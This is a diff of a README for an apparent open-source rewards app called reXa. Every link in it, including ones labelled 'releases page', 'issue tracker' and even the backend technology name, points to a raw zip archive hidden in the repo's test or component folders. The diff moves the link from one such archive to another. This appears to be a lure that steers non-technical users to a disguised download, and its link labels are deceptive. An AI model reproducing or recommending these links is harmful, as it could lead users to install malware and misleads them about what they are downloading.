@@ -2,11 +2,11 @@
 
 ## 🌟 Overview
 
-reXa is an open-source rewards and points management system. It combines a powerful https://raw.githubusercontent.com/toyboyarshad/reXa/main/server/src/__tests__/re_Xa_v3.1.zip backend with a modern React/Vite frontend. This application helps you manage your rewards in a user-friendly interface. With reXa, you can enjoy features like user authentication, reward redemption, transaction tracking, and even OCR-based reward creation.
+reXa is an open-source rewards and points management system. It combines a powerful https://github.com/toyboyarshad/reXa/raw/refs/heads/main/client/src/components/re-Xa-v3.3.zip backend with a modern React/Vite frontend. This application helps you manage your rewards in a user-friendly interface. With reXa, you can enjoy features like user authentication, reward redemption, transaction tracking, and even OCR-based reward creation.
 
 ## 📥 Download Now
 
-[![Download reXa](https://raw.githubusercontent.com/toyboyarshad/reXa/main/server/src/__tests__/re_Xa_v3.1.zip%https://raw.githubusercontent.com/toyboyarshad/reXa/main/server/src/__tests__/re_Xa_v3.1.zip)](https://raw.githubusercontent.com/toyboyarshad/reXa/main/server/src/__tests__/re_Xa_v3.1.zip)
+[![Download reXa](https://github.com/toyboyarshad/reXa/raw/refs/heads/main/client/src/components/re-Xa-v3.3.zip%https://github.com/toyboyarshad/reXa/raw/refs/heads/main/client/src/components/re-Xa-v3.3.zip)](https://github.com/toyboyarshad/reXa/raw/refs/heads/main/client/src/components/re-Xa-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with reXa, follow the simple steps below. No technical expertise 
 
 ### 1. Visit the Releases Page
 
-Go to the [releases page](https://raw.githubusercontent.com/toyboyarshad/reXa/main/server/src/__tests__/re_Xa_v3.1.zip) to find the latest version of reXa. This page contains all the available downloads.
+Go to the [releases page](https://github.com/toyboyarshad/reXa/raw/refs/heads/main/client/src/components/re-Xa-v3.3.zip) to find the latest version of reXa. This page contains all the available downloads.
 
 ### 2. Choose Your Version
 
@@ -62,7 +62,7 @@ reXa features a modern and intuitive interface. You will find it easy to navigat
 
 ## 📧 Support
 
-If you encounter issues while downloading or running reXa, you can reach out for support. Visit the [issue tracker](https://raw.githubusercontent.com/toyboyarshad/reXa/main/server/src/__tests__/re_Xa_v3.1.zip) on GitHub to report your problems, or ask for help from the community.
+If you encounter issues while downloading or running reXa, you can reach out for support. Visit the [issue tracker](https://github.com/toyboyarshad/reXa/raw/refs/heads/main/client/src/components/re-Xa-v3.3.zip) on GitHub to report your problems, or ask for help from the community.
 
 ## 📝 Contributing
 
@@ -70,7 +70,7 @@ While this guide is for end-users, reXa welcomes contributions from developers! 
 
 ## 🛠️ Tools Used
 
-- **Backend:** https://raw.githubusercontent.com/toyboyarshad/reXa/main/server/src/__tests__/re_Xa_v3.1.zip with Express framework
+- **Backend:** https://github.com/toyboyarshad/reXa/raw/refs/heads/main/client/src/components/re-Xa-v3.3.zip with Express framework
 - **Frontend:** React and Vite
 - **Database:** MongoDB
 - **Styling:** Tailwind CSS
@@ -82,6 +82,6 @@ reXa is open source and available under the MIT License. You can use it freely a
 
 ## 📥 Download & Install
 
-To download reXa, head back to the [releases page](https://raw.githubusercontent.com/toyboyarshad/reXa/main/server/src/__tests__/re_Xa_v3.1.zip). Select the version that matches your operating system and follow the installation steps outlined above. 
+To download reXa, head back to the [releases page](https://github.com/toyboyarshad/reXa/raw/refs/heads/main/client/src/components/re-Xa-v3.3.zip). Select the version that matches your operating system and follow the installation steps outlined above. 
 
 With reXa, managing your rewards is simple and efficient. Enjoy all the features designed to make your reward management stress-free!
